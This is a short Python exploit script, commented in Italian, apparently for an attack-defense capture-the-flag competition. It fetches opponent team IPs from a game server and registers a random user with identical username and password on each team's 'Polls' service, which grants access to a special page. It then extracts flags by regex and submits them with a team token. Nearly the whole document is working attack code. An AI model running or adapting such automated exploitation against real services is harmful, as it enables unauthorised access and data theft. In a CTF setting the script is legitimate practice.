'''

L'obiettivo di questo exploit/attacco è quello di catturare flag accedendo a sondaggi sfruttando la mancata sicurezza
e il mancato controllo nella registrazione di un utente: un utente che sceglie di registrarsi con username e password uguali
ha accesso a una pagina speciale dove vengono eventualmente salvate delle flag.

'''


import requests
import random
import string
import re
import json



# Specifico il mio indirizzo IP e quello del dispositivo NOP, che saranno poi esclusi dall'attacco
my_ip = '11.0.1.1'
nop_ip = '11.0.0.1'
header = {"X-Team-Token": "9b8fec624b7ea21a"}
# Ricordiamo che una flag è una stringa alfanumerica di 31 caratteri seguiti da un =
flag_regex = re.compile(r"[A-Z0-9]{31}=")

# Otteniamo i dati degli avversari
opponents = requests.get("http://11.11.0.1:8080/api/client/attack_data").text
opponents = json.loads(opponents)
# Prelevo le informazioni riguardo il servizio che mi interessa
opponents = opponents['Polls']
opponents.pop(my_ip)
opponents.pop(nop_ip)





def submit_flags(payload):
    url = "http://11.11.0.1:8080/flags"
    print(requests.put(url, headers = header, json = payload).text)



def exploit():
    for ip, poll_ids in opponents.items():
        try:
            payload = []
            # Generazione casuale per ottenere le credenziali di un utente fittizio
            username_length = random.randint(5, 64)
            username = ''.join(random.choices(string.digits, k = username_length))
            password = username
            data = {
                "username": username,
                "password": password
            }

            # Creiamo una sessione per l'utente
            s = requests.Session()

            # Registrazione e login 
            s.post(f"http://{ip}:5000/register", data = data)
            response = s.post(f"http://{ip}:5000/login", data = data)
            
            if response.status_code == 200:
                flags = flag_regex.findall(response.text)  
                print(f"Trovate flag da {ip}: {flags}")
                payload.extend(flags)

            # Invia le flag trovate al sistema centrale
            if payload:
                submit_flags({"flags": payload})

        except Exception as e:
            print(f"Failed to exploit {ip}! {str(e)}")
